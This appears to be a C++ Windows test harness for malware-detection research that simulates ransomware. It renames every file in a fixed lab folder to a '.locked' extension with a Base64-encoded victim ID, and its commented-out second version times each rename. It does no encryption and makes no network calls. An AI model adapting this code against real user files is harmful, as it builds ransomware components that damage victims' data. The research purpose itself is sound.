#include <iostream>
#include <string>
#include <Windows.h>
#include <vector>
#include <filesystem>

std::string base64_encode(const std::string& in) {
	// A very simple Base64 encoder for demo purposes. For production, use a library.
	static const char* table = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
	std::string out;
	int val = 0, valb = -6;
	for (unsigned char c : in) {
		val = (val << 8) + c;
		valb += 8;
		while (valb >= 0) {
			out.push_back(table[(val >> valb) & 0x3F]);
			valb -= 6;
		}
	}
	if (valb > -6) out.push_back(table[((val << 8) >> (valb + 8)) & 0x3F]);
	while (out.size() % 4) out.push_back('=');
	return out;
}

void RenameFilesWithExtension(const std::wstring & directory, const std::wstring & ransomware_ext, const std::string & victim_id = "") {
	WIN32_FIND_DATAW findFileData;
	std::wstring search_path = directory + L"\\*";
	HANDLE hFind = FindFirstFileW(search_path.c_str(), &findFileData);

	if (hFind == INVALID_HANDLE_VALUE) {
		std::wcout << L"[-] Failed to open directory: " << directory << std::endl;
		return;
	}

	do {
		// Skip . and ..
		if (wcscmp(findFileData.cFileName, L".") == 0 || wcscmp(findFileData.cFileName, L"..") == 0)
			continue;

		std::wstring full_path = directory + L"\\" + findFileData.cFileName;

		if (!(findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
			// Not a directory -- file!
			std::wstring new_name = full_path;

			// Remove the old extension, if any
			size_t last_dot = new_name.find_last_of(L'.');
			if (last_dot != std::wstring::npos)
				new_name = new_name.substr(0, last_dot);

			// If a victim_id is provided, Base64 encode it and append it before the extension
			std::wstring new_extension = ransomware_ext;
			if (!victim_id.empty()) {
				std::string encoded_id = base64_encode(victim_id);
				new_extension = L"." + std::wstring(encoded_id.begin(), encoded_id.end()) + ransomware_ext;
			}

			new_name += new_extension;

			// Rename the file
			if (MoveFileExW(full_path.c_str(), new_name.c_str(), MOVEFILE_COPY_ALLOWED | MOVEFILE_REPLACE_EXISTING)) {
				std::wcout << L"[+] Renamed: " << full_path << L" -> " << new_name << std::endl;
			}
			else {
				std::wcout << L"[-] Failed to rename: " << full_path << std::endl;
			}
		}
	} while (FindNextFileW(hFind, &findFileData));
	FindClose(hFind);
}

int main()
{
	std::string value;
	std::wstring files_dir = L"C:\\Users\\User\\Documents\\MalwareAnalysis\\MalwareEvaluation-main\\ClipboardLogger\\Debug\\Files";
	std::wstring ransomware_ext = L".locked";  // You can use ".encrypted", ".REvil", etc.
	std::string victim_id = "victim123"; // Optional: victim identifier, could be a key, etc.

	while (true)
	{
		// Output the current process Id
		HANDLE currentThread = GetCurrentThread();
		std::cout << "Process id: ";
		std::cout << GetProcessIdOfThread(currentThread);
		std::cout << "\n";
		CloseHandle(currentThread);

		std::cout << "Press <enter> to Beep (Ctrl-C to exit): ";
		std::getline(std::cin, value);
		Beep(500, 500);

		// Demonstrate ransomware file renaming after each beep
		RenameFilesWithExtension(files_dir, ransomware_ext, victim_id);

		std::cout << "File renaming (extension change) executed.\n";
	}
	return 0;
}



/*
#include <iostream>
#include <string>
#include <Windows.h>
#include <vector>
#include <filesystem>
#include <chrono>

std::string base64_encode(const std::string& in) {
	static const char* table = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
	std::string out;
	int val = 0, valb = -6;
	for (unsigned char c : in) {
		val = (val << 8) + c;
		valb += 8;
		while (valb >= 0) {
			out.push_back(table[(val >> valb) & 0x3F]);
			valb -= 6;
		}
	}
	if (valb > -6) out.push_back(table[((val << 8) >> (valb + 8)) & 0x3F]);
	while (out.size() % 4) out.push_back('=');
	return out;
}

void RenameFilesWithExtension(const std::wstring & directory, const std::wstring & ransomware_ext, const std::string & victim_id = "") {
	WIN32_FIND_DATAW findFileData;
	std::wstring search_path = directory + L"\\*";
	HANDLE hFind = FindFirstFileW(search_path.c_str(), &findFileData);

	if (hFind == INVALID_HANDLE_VALUE) {
		std::wcout << L"[-] Failed to open directory: " << directory << std::endl;
		return;
	}

	int attemptCount = 0;
	double totalMicroseconds = 0.0;

	do {
		// Skip . and ..
		if (wcscmp(findFileData.cFileName, L".") == 0 || wcscmp(findFileData.cFileName, L"..") == 0)
			continue;

		std::wstring full_path = directory + L"\\" + findFileData.cFileName;

		if (!(findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
			std::wstring new_name = full_path;

			// Remove the old extension, if any
			size_t last_dot = new_name.find_last_of(L'.');
			if (last_dot != std::wstring::npos)
				new_name = new_name.substr(0, last_dot);

			// If a victim_id is provided, Base64 encode it and append before extension
			std::wstring new_extension = ransomware_ext;
			if (!victim_id.empty()) {
				std::string encoded_id = base64_encode(victim_id);
				new_extension = L"." + std::wstring(encoded_id.begin(), encoded_id.end()) + ransomware_ext;
			}
			new_name += new_extension;

			// Overhead calculation starts here
			auto start = std::chrono::high_resolution_clock::now();

			BOOL result = MoveFileExW(full_path.c_str(), new_name.c_str(), MOVEFILE_COPY_ALLOWED | MOVEFILE_REPLACE_EXISTING);

			auto end = std::chrono::high_resolution_clock::now();
			std::chrono::duration<double, std::micro> duration = end - start;

			totalMicroseconds += duration.count();
			++attemptCount;

			if (result) {
				std::wcout << L"[+] Renamed: " << full_path << L" -> " << new_name
					<< L" (Time: " << duration.count() << L" µs)" << std::endl;
			}
			else {
				std::wcout << L"[-] Failed to rename: " << full_path
					<< L" (Time: " << duration.count() << L" µs)" << std::endl;
			}
		}
	} while (FindNextFileW(hFind, &findFileData));
	FindClose(hFind);

	if (attemptCount > 0) {
		double avgTime = totalMicroseconds / attemptCount;
		std::wcout << L"[*] Total files attempted: " << attemptCount << std::endl;
		std::wcout << L"[*] Total time spent: " << totalMicroseconds << L" µs" << std::endl;
		std::wcout << L"[*] Average time per attempt: " << avgTime << L" µs" << std::endl;
	}
	else {
		std::wcout << L"[!] No files found to rename." << std::endl;
	}
}

int main()
{
	std::string value;
	std::wstring files_dir = L"C:\\Users\\User\\Documents\\MalwareAnalysis\\MalwareEvaluation-main\\ClipboardLogger\\Debug\\Files";
	std::wstring ransomware_ext = L".locked";  // You can use ".encrypted", ".REvil", etc.
	std::string victim_id = "victim123"; // Optional: victim identifier, could be a key, etc.

	while (true)
	{
		// Output the current process Id
		HANDLE currentThread = GetCurrentThread();
		std::cout << "Process id: ";
		std::cout << GetProcessIdOfThread(currentThread) << "\n";
		CloseHandle(currentThread);

		std::cout << "Press <enter> to Beep (Ctrl-C to exit): ";
		std::getline(std::cin, value);
		Beep(500, 500);

		// Demonstrate ransomware file renaming after each beep
		RenameFilesWithExtension(files_dir, ransomware_ext, victim_id);

		std::cout << "File renaming (extension change) executed.\n";
	}
	return 0;
}
*/